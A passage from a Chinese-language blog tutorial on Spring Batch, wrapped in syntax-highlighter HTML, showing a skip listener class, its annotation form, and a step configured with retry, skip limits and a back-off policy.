&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4654e314816687-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4654e314816687-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4654e314816687-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4654e314816687-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4654e314816687-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4654e314816687-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4654e314816687-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4654e314816687-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4654e314816687-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4654e314816687-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4654e314816687-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4654e314816687-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4654e314816687-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4654e314816687-16&quot;&gt;16&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4654e314816687-1&quot;&gt;
&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;CustomSkipListener&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;implements&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;SkipListener&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4654e314816687-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Override&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4654e314816687-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;onSkipInRead&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Throwable&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4654e314816687-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// business logic&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4654e314816687-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4654e314816687-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4654e314816687-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Override&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4654e314816687-8&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;onSkipInWrite&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Throwable&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4654e314816687-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// no need&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4654e314816687-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4654e314816687-11&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4654e314816687-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Override&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4654e314816687-13&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;onSkipInProcess&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Throwable&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4654e314816687-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// no need&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4654e314816687-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4654e314816687-16&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0020 seconds] --&gt;
&lt;p&gt;而使用annoation的方式可以简写为：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a46554872871848&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
public class CustomSkipListener {
    @OnSkipInRead
    public void onSkipInRead(Throwable t) {
        // business logic
    }
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46554872871848-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46554872871848-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46554872871848-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46554872871848-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46554872871848-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46554872871848-6&quot;&gt;6&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46554872871848-1&quot;&gt;
&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;CustomSkipListener&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46554872871848-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;OnSkipInRead&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46554872871848-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;onSkipInRead&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Throwable&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46554872871848-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// business logic&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46554872871848-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46554872871848-6&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0009 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;使用Retry和Skip增强批处理工作的健壮性&lt;/h3&gt;
&lt;p&gt;在处理百万级的数据过程过程中难免会出现异常。如果一旦出现异常而导致整个批处理工作终止的话那么会导致后续的数据无法被处理。Spring Batch内置了Retry（重试）和Skip（跳过）机制帮助我们轻松处理各种异常。我们需要将异常分为三种类型。第一种是需要进行Retry的异常，它们的特点是该异常可能会随着时间推移而消失，比如数据库目前有锁无法写入、web服务当前不可用、web服务满载等。所以对它们适合配置Retry机制。第二种是需要Skip的异常，比如解析文件的某条数据出现异常等，因为对这些异常即使执行Retry每次的结果也都是相同，但又不想由于某条数据出错而停止对后续数据的处理。第三种异常是需要让整个Job立刻失败的异常，比如如果出现了OutOfMemory的异常，那么需要整个Job立刻终止运行。&lt;/p&gt;
&lt;p&gt;一般来说需要Retry的异常也要配置Skip选项，从而保证后续的数据能够被继续处理。我们也可以配置SkipLimit选项保证当Skip的数据条目达到一定数量后及时终止整个Job。&lt;/p&gt;
&lt;p&gt;有时候我们需要在每次Retry中间隔做一些操作，比如延长Retry时间，恢复操作现场等，Spring Batch提供了BackOffPolicy来达到目的。下面是一个配置了Retry机制、Skip机制以及BackOffPolicy的step示例。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a46558361439188&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
@Bean
public Step step(){
    return stepBuilders.get(&quot;step&quot;)
        .chunk(1)
        .reader(reader())
        .processor(processor())
        .writer(writer())
        .listener(logProcessListener())
        .faultTolerant()
        .skipLimit(10)
        .skip(UnknownGenderException.class)
        .skip(ServiceUnavailableException.class)
        .retryLimit(5)
        .retry(ServiceUnavailableException.class)
        .backOffPolicy(backoffPolicy)
        .listener(logSkipListener())
        .build();
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46558361439188-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46558361439188-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46558361439188-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46558361439188-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46558361439188-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46558361439188-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46558361439188-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46558361439188-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46558361439188-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46558361439188-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46558361439188-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46558361439188-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46558361439188-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46558361439188-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46558361439188-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46558361439188-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46558361439188-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46558361439188-18&quot;&gt;18&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46558361439188-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Bean&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46558361439188-2&quot;&gt;
&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Step &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;step&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46558361439188-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stepBuilders&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;step&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46558361439188-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46558361439188-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46558361439188-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;processor&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;processor&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46558361439188-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;writer&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;writer&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46558361439188-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;listener&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;logProcessListener&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46558361439188-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;faultTolerant&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
